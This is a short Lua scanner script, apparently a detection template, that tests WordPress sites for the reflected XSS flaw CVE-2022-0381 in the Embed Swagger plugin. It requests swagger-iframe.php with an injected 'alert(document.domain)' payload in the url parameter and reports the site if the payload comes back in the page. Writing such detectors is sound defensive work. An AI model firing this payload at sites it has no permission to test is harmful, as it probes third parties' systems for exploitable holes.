SCAN_TYPE = 3

local function send_report(url)
    CveReport:setName("CVE-2022-0381")
    CveReport:setDescription("WordPress Embed Swagger plugin 1.0.0 and prior contains a reflected cross-site scripting vulnerability due to insufficient escaping/sanitization and validation via the url parameter found in the ~/swagger-iframe.php file, which allows attackers to inject arbitrary web scripts onto the page.")
    CveReport:setRisk("medium")
    CveReport:setUrl(url)
    Reports:addCveReport(CveReport)
    print_cve_report(CveReport)
end

function scan_cve(target_path)
    local new_url = HttpMessage:urlJoin(target_path)
    local resp_status, resp = pcall(function ()
        return http:send("GET", new_url)
    end)
    if resp_status == true then
        local url = resp.url
        local body = resp.body
        local headers = resp.headers
        for header_name,header_value in pairs(headers) do 
            if str_contains(header_value,"text/html") then 
                if str_contains(body,'url: xss://"-alert(document.domain)') == true then 
                    CveReport:addMatcher('url: xss://"-alert(document.domain)',3)  -- 3 = response body
                    CveReport:addMatcher('text/html',2)  -- 2 = response headers
                    CveReport:addMatcher("200",4)  -- 4 = response status
                    send_report(url)
                end
            end
        end
    end
end

function main()
    scan_cve("/wp-content/plugins/embed-swagger/swagger-iframe.php?url=xss://%22-alert(document.domain)-%22")
end
